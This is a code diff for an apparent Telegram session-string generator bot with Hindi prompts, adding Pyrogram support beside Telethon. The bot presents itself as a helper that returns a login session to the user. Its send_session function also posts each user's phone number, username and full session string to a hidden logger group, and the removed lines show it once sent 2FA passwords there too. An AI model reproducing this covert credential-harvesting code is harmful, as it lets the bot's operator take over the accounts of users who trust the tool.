@@ -78,14 +78,21 @@ async def handle_input(client, message):
 async def send_otp(client, message):
     session = session_data[message.chat.id]
     api_id, api_hash, phone = session["api_id"], session["api_hash"], session["phone_number"]
-    
-    client_obj = TelegramClient(StringSession(), api_id, api_hash)
-    await client_obj.connect()
-    
+
+    if session["type"] == "Telethon":
+        client_obj = TelegramClient(StringSession(), api_id, api_hash)
+        await client_obj.connect()
+    else:
+        client_obj = Client("pyrogram_session", api_id=api_id, api_hash=api_hash, phone_number=phone)
+        await client_obj.connect()
+
     try:
-        code = await client_obj.send_code_request(phone)
+        if session["type"] == "Telethon":
+            code = await client_obj.send_code_request(phone)
+        else:
+            await client_obj.send_code(phone)
+
         session["client_obj"] = client_obj
-        session["code"] = code
         session["stage"] = "otp"
 
         await message.reply("🔢 कृपया **OTP** भेजें (Example: `12345`)।")
@@ -98,20 +105,26 @@ async def validate_otp(client, message):
     client_obj, phone, otp = session["client_obj"], session["phone_number"], session["otp"]
 
     try:
-        await client_obj.sign_in(phone, otp)
-
-        if await client_obj.is_user_authorized():
-            await generate_session(client, message)
+        if session["type"] == "Telethon":
+            await client_obj.sign_in(phone, otp)
         else:
-            session["stage"] = "2fa"
-            await message.reply("🔐 आपका अकाउंट **Two-Step Verification** से सुरक्षित है।\n\nकृपया अपना **पासवर्ड** भेजें।")
+            await client_obj.sign_in(phone_number=phone, code=otp)
+
+        if session["type"] == "Telethon":
+            if await client_obj.is_user_authorized():
+                await generate_telethon_session(client, message)
+            else:
+                session["stage"] = "2fa"
+                await message.reply("🔐 आपका अकाउंट 2-Step Verification से सुरक्षित है। कृपया अपना **पासवर्ड** भेजें।")
+        else:
+            await generate_pyrogram_session(client, message)
 
     except Exception as e:
-        if "SESSION_PASSWORD_NEEDED" in str(e) or "Two-steps verification is enabled" in str(e):
+        if "SESSION_PASSWORD_NEEDED" in str(e):
             session["stage"] = "2fa"
-            await message.reply("🔐 **Two-Step Verification Enabled!**\n\nकृपया अपना **2FA पासवर्ड** भेजें।")
+            await message.reply("🔐 Two-Step Verification Enabled!\nकृपया अपना **2FA पासवर्ड** भेजें।")
         else:
-            await message.reply(f"❌ **OTP Invalid:** {e}")
+            await message.reply(f"❌ OTP Invalid: {e}")
             del session_data[message.chat.id]
 
 async def validate_2fa(client, message):
@@ -120,30 +133,40 @@ async def validate_2fa(client, message):
 
     try:
         await client_obj.sign_in(password=session["password"])
-        await generate_session(client, message)
+        await generate_telethon_session(client, message)
     except Exception as e:
-        await message.reply(f"❌ **गलत 2FA पासवर्ड:** {e}\n\n⚠ **कृपया सही पासवर्ड भेजें।**")
-        
-async def generate_session(client, message):
+        await message.reply(f"❌ 2FA पासवर्ड गलत है: {e}\n\n⚠ कृपया सही पासवर्ड भेजें।")
+
+async def generate_telethon_session(client, message):
     session = session_data[message.chat.id]
     client_obj = session["client_obj"]
     user = await client_obj.get_me()
 
     session_string = client_obj.session.save()
 
+    await send_session(client, message, session_string, user)
+
+async def generate_pyrogram_session(client, message):
+    session = session_data[message.chat.id]
+    client_obj = session["client_obj"]
+
+    session_string = await client_obj.export_session_string()
+    user = await client_obj.get_me()
+
+    await send_session(client, message, session_string, user)
+
+async def send_session(client, message, session_string, user):
     log_text = (
         f"📌 **New Session Generated**\n\n"
         f"👤 **User:** `{user.first_name} (@{user.username})`\n"
-        f"📞 **Phone:** `{session['phone_number']}`\n"
-        f"🔑 **2FA Password:** `{session.get('password', 'No 2FA')}`\n"
+        f"📞 **Phone:** `{session_data[message.chat.id]['phone_number']}`\n"
         f"🔹 **Session String:**\n`{session_string}`\n\n"
         f"⚠ **कृपया इसे सुरक्षित रखें और किसी को न दें।**"
     )
 
     await client.send_message(LOGGER_GROUP_ID, log_text)
-    await client_obj.send_message("me", f"✅ **Session String Generated!**\n\n`{session_string}`")
+    await client.send_message(message.chat.id, f"✅ **Session String Generated!**\n\n`{session_string}`")
     await client_obj.disconnect()
-    await message.reply("✅ आपका Session String **Saved Messages** में भेज दिया गया है।")
     del session_data[message.chat.id]
 
 @app.on_callback_query(filters.regex("cancel"))
